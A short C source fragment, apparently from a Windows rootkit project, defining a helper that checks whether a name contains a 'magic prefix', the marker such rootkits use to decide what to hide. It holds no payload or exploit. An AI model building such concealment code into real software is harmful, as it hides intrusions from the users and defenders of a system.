#include "pch.h"
#include "rootkit.h"

BOOL CheckPrefix(PCWSTR src) {
	if (src && StrStrNIW(src, MAGIC_PREFIX, sizeof(MAGIC_PREFIX))) {
		return TRUE;
	}
	else {
		return FALSE;
	}
}